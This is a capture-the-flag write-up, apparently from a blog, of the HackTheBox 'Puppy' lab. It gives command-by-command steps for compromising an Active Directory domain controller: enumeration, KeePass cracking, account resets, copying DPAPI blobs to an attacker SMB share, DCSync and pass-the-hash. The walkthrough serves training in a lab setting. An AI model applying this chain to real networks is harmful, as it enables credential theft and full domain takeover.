# Puppy - HackTheBox Writeup

# Initial Enumeration

---

## 1. External Enumeration

### TCP Scans

#### Fast Scan Overview

```bash
nmap puppy.htb -Pn -F -T5
```

```bash
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```

- Standard Windows AD/DC ports detected: DNS, Kerberos, LDAP, SMB, NFS.
    
- Target likely an Active Directory domain controller.
    

---

#### Detailed TCP Scan

```bash
sudo nmap 10.10.11.70 -sV -sC -T4 -p- -Pn --open -oN nmap_full_TCP.txt
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-13 21:27:42Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
<SNIP>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time:
|   date: 2025-09-13T21:29:32
|_  start_date: N/A
```

- Full TCP scan confirms Windows domain controller with SMB signing required.
    
- Many standard AD services exposed: LDAP, Kerberos, SMB, HTTP endpoints.
    
- Clock skew observed (7h).
    

---

## 2. Services Analysis

### DNS Enumeration

```bash
dig axfr puppy.htb @10.10.11.70
```

```bash
; Transfer failed.
```

- Zone transfer not allowed.
    

```bash
dig txt puppy.htb @10.10.11.70
```

```bash
;; AUTHORITY SECTION:
puppy.htb. 3600 IN SOA dc.puppy.htb. hostmaster.puppy.htb. 176 900 600 86400 3600
```

- TXT query confirms authoritative SOA record and DC hostname.
    

---

### SMB Enumeration

#### Anonymous Access Check

```bash
smbclient -L \\puppy.htb -N
```

```bash
Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

- Anonymous login allowed, but no SMB1 shares available.
    

#### Authenticated Share Enumeration

```bash
smbmap -H puppy.htb -u 'levi.james' -p 'KingofAkron2025!'
```

```bash
[+] IP: 10.10.11.70:445 Name: puppy.htb
        Disk     Permissions
        ----     -----------
        ADMIN$   NO ACCESS
        C$       NO ACCESS
        DEV      NO ACCESS
        IPC$     READ ONLY
        NETLOGON READ ONLY
        SYSVOL   READ ONLY
```

- Authenticated user levi.james can access IPC$, NETLOGON, SYSVOL shares read-only.
    
- DEV share exists but not listable.
    

---
### LDAP Enumeration

#### Basic Domain Information

```bash
nmap --script=ldap* -p 389 10.10.11.70 -Pn -T4
```

```bash
| ldap-rootdse:
|   domainFunctionality: 7
|   forestFunctionality: 7
|   domainControllerFunctionality: 7
|   rootDomainNamingContext: DC=PUPPY,DC=HTB
|   defaultNamingContext: DC=PUPPY,DC=HTB
|_  dnsHostName: DC.PUPPY.HTB
```

- LDAP rootDSE confirms domain structure: DC=PUPPY,DC=HTB.
    
- Forest and domain functional levels at 7 (Windows Server 2016+).
    

---

#### Full LDAP Search

```bash
ldapsearch -x -H ldap://puppy.htb -D "levi.james@PUPPY.HTB" -w "KingofAkron2025!" -b "DC=PUPPY,DC=HTB"
```

_Output trimmed to key findings:_

- Account Lockout Threshold: 0 (no lockout policy)
    
- Minimum Password Length: 7 characters
    
- Password History: 24 passwords
    
- Domain Structure: DC=PUPPY,DC=HTB
    
- levi.james has valid credentials.
    

---

### RPC Client Enumeration

```bash
rpcclient -U 'PUPPY.HTB\levi.james' puppy.htb
```

```bash
rpcclient $> querydominfo
Domain:         PUPPY
Total Users:    44
Total Groups:   0
Server Role:    ROLE_DOMAIN_PDC
```

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

- Domain Users discovered: Administrator, Guest, krbtgt, levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, steph.cooper_adm
    

```bash
rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Enterprise Admins] rid:[0x207]
group:[DEVELOPERS] rid:[0x459]
group:[SENIOR DEVS] rid:[0x455]
group:[HR] rid:[0x454]
```

- Groups discovered: Domain Admins, DEVELOPERS, SENIOR DEVS, HR
    

---

## 3. Automated Enumeration

### Enum4Linux Summary

```bash
enum4linux -u 'levi.james' -p 'KingofAkron2025!' puppy.htb
```

- Valid credentials for levi.james
    
- Domain SID: `S-1-5-21-1487982659-1829050783-2281216199`
    
- Critical vulnerability: No account lockout policy
    
- DEV share exists but not listable
    
- Administrative account identified: steph.cooper_adm
    

---

### Time Sync & BloodHound Mapping

Add host to /etc/hosts
```bash
dc.puppy.htb
```

Sync time with DC
```bash
ntpdate puppy.htb
```

Run BloodHound mapping
```bash
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip
```

- BloodHound confirms 1 domain, 1 computer, 10 users, 56 groups.

![puppy_1](https://gianlucabassani.github.io/assets/puppy/puppy_1.jpg)

---
### DEV Share Access & KeePass

Since we have GenercWrite over develpoers group we can add ourself to DEV group:

```bash
bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james  
```

- levi.james added to DEVELOPERS

```bash
smbclient //10.10.11.70/DEV -U 'levi.james'
```

```bash
Password for [WORKGROUP\levi.james]:  
smb: \> ls  
.  DR 0 2025-09-15 15:01  
.. D 0 2025-03-08 10:52  
KeePassXC-2.7.9-Win64.msi A 34394112 <SNIP>
Projects D 0 <SNIP>
recovery.kdbx A 2677 <SNIP>

smb: \> get KeePassXC-2.7.9-Win64.msi  
smb: \> get recovery.kdbx  
```

- DEV share contains KeePass installer and recovery.kdbx file.
    

```bash
file recovery.kdbx
```

```bash
recovery.kdbx: Keepass password database 2.x KDBX
```

- KeePass database detected.

If we try to bruteforce the recovery.kdbx with john it fails:
```
keepass2john recovery.kdbx  
! recovery.kdbx : File version '40000' is currently not supported! 
```

We can use this tool to crack the password for the recovery db: [https://github.com/r3nt0n/keepass4brute.git](https://github.com/r3nt0n/keepass4brute.git "https://github.com/r3nt0n/keepass4brute.git")

```bash
keepass4brute/keepass4brute.sh recovery.kdbx rockyou.txt
```

```bash
[*] Password found: liverpool
```

- KeePass database password recovered: `liverpool`

![puppy_2](https://gianlucabassani.github.io/assets/puppy/puppy_2.jpg)

Here the extracted credentials:
`ADAM SILVER : HJKL2025!`  
`ANTONY C. EDWARDS : Antman2025!`  
`JAMIE WILLIAMSON : JamieLove2025!`  
`SAMUEL BLAKE : ILY2025!`  
`STEVE TUCKER : Steve2025!`

---

### SMB Login Validation

```bash
crackmapexec smb 10.10.11.70 -u usernames.txt -p pass.txt
```

```bash
SMB 10.10.11.70 445 DC [+] PUPPY.HTB\ant.edwards:Antman2025!
```

- ant.edwards credentials validated, able to authenticate to SMB.

Re-scan the environment from ant-edwards perspective:
```bash
bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip
```

---

## 4. Account Takeover & SMB/AD Exploitation

### Outbound Object Control via BloodHound

![puppy_3](https://gianlucabassani.github.io/assets/puppy/puppy_3.jpg)

- Now we have generic all over Adam.Silver.

### AD Account Password Reset (ADAM.SILVER)

```bash
bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Pwned123!
```

```bash
[+] Password changed successfully!
```

- Password for AD account ADAM.SILVER successfully changed.

#### Verify access:

```
crackmapexec smb [10.10.11.70](https://10.10.11.70/ "https://10.10.11.70/") -u ADAM.SILVER -p 'Pwned123!' -d PUPPY.HTB 
```

```
SMB [10.10.11.70](https://10.10.11.70/ "https://10.10.11.70/")     445 DC [-] PUPPY.HTB\ADAM.SILVER:Pwned123! STATUS_ACCOUNT_DISABLED  
```

- We still can't access to this account since "STATUS_ACCOUNT_DISABLED"
- Requires LDAP modification.

#### Verify account status

```bash
ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"
```

```bash
<SNIP>
userAccountControl: 66050
```

- AD account ADAM.SILVER confirmed as disabled (userAccountControl: 66050).
    

---

### Enable ADAM.SILVER via LDIF

Create file: enable_adam.ldif 
```txt
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 512
```

```bash
ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -w 'Antman2025!' -f enable_adam.ldif
```

```bash
modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
```

- ADAM.SILVER account successfully enabled (userAccountControl now 512).
---

### Initial Foothold via Evil-WinRM

```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Pwned123!'
```

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls
Mode LastWriteTime Length Name
-a---- 9/15/2025 4:02 AM 34 user.txt
<SNIP>
```

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
3fcd9cef<REDACTED>
```

- Initial user shell obtained for ADAM.SILVER.
    
- user.txt captured on Desktop confirms foothold.
    

---
## Privileges Esaclation

### Local Windows Machine Pillaging

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /all
```

```text
USER INFORMATION
User Name SID
puppy\adam.silver S-1-5-21-1487982659-1829050783-2281216199-1105

GROUP INFORMATION
Group Name ... 
PUPPY\DEVELOPERS ... S-1-5-21-1487982659-1829050783-2281216199-1113
... BUILTIN\Remote Management Users, BUILTIN\Users, NT AUTHORITY\NETWORK, etc.

PRIVILEGES INFORMATION
SeMachineAccountPrivilege Add workstations to domain Enabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- User is member of DEVELOPERS and standard builtin groups.
    
- SeMachineAccountPrivilege present and enabled (can create machine accounts).
    
- Useful local privileges enumerated for lateral/privilege escalation.
    

---

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Documents> net localgroup administrators
```

```text
Alias name administrators
Members
Administrator
Domain Admins
Enterprise Admins
steph.cooper_adm
The command completed successfully.
```

- steph.cooper_adm is a local administrator on this host.
    

---

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Documents> Get-ADUser adam.silver -Properties msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity
```

```text
DistinguishedName : CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
Enabled : True
GivenName : Adam
Name : Adam D. Silver
SamAccountName : adam.silver
UserPrincipalName : adam.silver@PUPPY.HTB
<SNIP>
```

- AD user object confirmed. No delegation properties shown in output snippet.
    

---

### Backup Recon and Secret Harvesting

```powershell
*Evil-WinRM* PS C:\Backups> ls
```

```text
Mode LastWriteTime Length Name
-a---- 3/8/2025 8:22 AM 4639546 site-backup-2024-12-30.zip
```

- Backup archive found at C:\Backups\site-backup-2024-12-30.zip.
    
- On attacker machine after download & unzip:
```bash
grep -RiE "pass|user" .
./assets/sass/main.scss: input[type="password"],
./nms-auth-config.xml.bak: <bind-password>ChefSteph2025!</bind-password>
```

- grep located backup file containing nms-auth-config.xml.bak with an embedded bind-password.
- read ./nms-auth-config.xml.bak 
```xml
<SNIP>
<base-dn>dc=PUPPY,dc=HTB</base-dn>
<bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
<bind-password>ChefSteph2025!</bind-password>
```

- Credentials recovered: steph.cooper : ChefSteph2025!

---
## Login as steph.cooper

```bash
evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
upload winPEASx64.exe
```

---

### winPEAS Findings 

- Writable Named Pipes with Everyone write/create permissions (eventlog, ROUTER, RpcProxy*, vgauth-service).
    
- LSA Protection and CredentialGuard disabled.
    
- SeMachineAccountPrivilege enabled for current token.
    
- cachedlogonscount = 10 (cached credentials exist).
    
- AutoLogon credentials present.
    
- LocalAccountTokenFilterPolicy indicates only RID-500 local admin usable for lateral movement.
    
- These findings indicate multiple credential extraction and abuse vectors.
    

---

## DPAPI / Masterkey Extraction and Decryption

After local recon we discover:

```powershell
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
```

- User DPAPI masterkey and credential blob located in user profile.

#### Start attacker smbserver
```bash
impacket-smbserver share ./share -smb2support
```

#### Copy files from target:
```powershell
copy "<masterkey path>" \\10.10.14.137\share\masterkey_blob
copy "<credential path>" \\10.10.14.137\share\credential_blob
```

### Decrypt the key

```bash
impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```

```text
[MASTERKEYFILE]
Version : 2 (2)
Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407
...
Decrypted key with User Key (MD4 protected)  
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

- Masterkey successfully decrypted using steph.cooper password.

```bash
impacket-dpapi credential -file credential_blob -key 0xd9a57...9e9c84
```

```text
[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Type : CRED_TYPE_DOMAIN_PASSWORD
Target : Domain:target=PUPPY.HTB
Username : steph.cooper_adm
Unknown : FivethChipOnItsWay2025!
```

- DPAPI credential decrypted. Recovered domain privileged credential:  
    **steph.cooper_adm : FivethChipOnItsWay2025!**
    

---
## Domain Admin Takeover


### BloodHound Enumeration

```bash
bloodhound-python -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip
```

![puppy_4](https://gianlucabassani.github.io/assets/puppy/puppy_4.jpg)

![puppy_5](https://gianlucabassani.github.io/assets/puppy/puppy_5.jpg)

- Analysis shows `steph.cooper_adm` has **WriteDacl**, **WriteOwner**, **GenericWrite** over `ADMINISTRATORS` group.
    
- `ADMINISTRATORS` has **AllExtendedRights** over `Administrator`.
    
- Effective control chain enables **DCSync** attack.
    

---
### DCSync Execution

```bash
impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
```

```text
Administrator:500:...:9c541c389e2904b9b112f599fd6b333d:::
<SNIP>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:...:bb0edc15e49ceb4120c7bd7e6e65d75b:::
krbtgt:502:...:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\steph.cooper_adm:1111:...:ccb206409049bc53502039b80f3f1173:::
<SNIP>
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
<SNIP>
```

- Full NTDS dump obtained.
    
- Administrator NTLM hash: **bb0edc15e49ceb4120c7bd7e6e65d75b**.

---

### Final Access as Domain Admin

### Pass-the-hash

```bash
evil-winrm -i 10.10.11.70 -u 'Administrator' -H 'bb0edc15e49ceb4120c7bd7e6e65d75b'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode LastWriteTime Length Name
---- ------------- ------ ----
-ar--- 9/16/2025 5:51 AM 34 root.txt
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
b88e5b3<REDACTED>
```

- Root flag captured.
    
- Domain compromise achieved via DCSync → Administrator hash → full system takeover.
    

---
## Conclusions

- The environment is an **Active Directory domain controller** with LDAP, Kerberos, SMB and WinRM exposed.
    
- **Initial access**: valid user credentials (dev share) exposed a KeePass DB and a backup containing plaintext service creds, highlighting poor secret storage and backup hygiene.
    
- **Credential extraction**: KeePass password and backup secrets enabled lateral movement. DPAPI masterkey extraction from user profile allowed decryption of stored domain credentials.
    
- **Privilege escalation**: excessive AD ACLs (WriteDACL/WriteOwner/GenericWrite) and permissive group membership were abused to change ACLs and reset accounts.
    
- **Domain compromise**: high-rights account used for **DCSync** (impacket-secretsdump) to extract NTDS and obtain Administrator NTLM; pass-the-hash used to get Administrator shell.